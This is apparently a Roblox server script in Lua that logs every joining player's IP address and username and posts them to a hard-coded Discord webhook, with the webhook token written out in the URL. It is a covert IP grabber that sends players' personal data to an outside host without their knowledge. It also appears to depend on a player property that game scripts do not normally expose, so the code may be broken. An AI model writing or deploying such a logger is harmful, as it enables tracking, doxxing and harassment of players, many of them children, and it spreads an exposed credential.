local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1222254468557443213/wf2ulJG7iP1A6HqxyAeY2OipyJVL-PEN96xpDVFUMzTX8T5Ce9FPfMju9rZprlIZp5gQ"

-- Table to store IP addresses
local ip_table = {}

-- Function to log IP addresses
local function logIp(player)
    local ip = player.Address
    local username = player.Name
    
    -- Check for existing IP
    for _, stored_ip in ipairs(ip_table) do
        if stored_ip == ip then
            return
        end
    end

    -- Add new IP to the table
    table.insert(ip_table, ip)

    -- Send IP and username to Discord webhook
    local payload = {
        content = string.format("[New IP] %s (Username: %s)", ip, username),
    }

    HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
end

-- Connect the function to PlayerAdded
Players.PlayerAdded:Connect(logIp)

-- Function to periodically clean the IP table
local function cleanIpTable()
    while wait(60 * 60) do -- Clean every hour
        ip_table = {}
    end
end

-- Start cleaning the IP table
spawn(cleanIpTable)
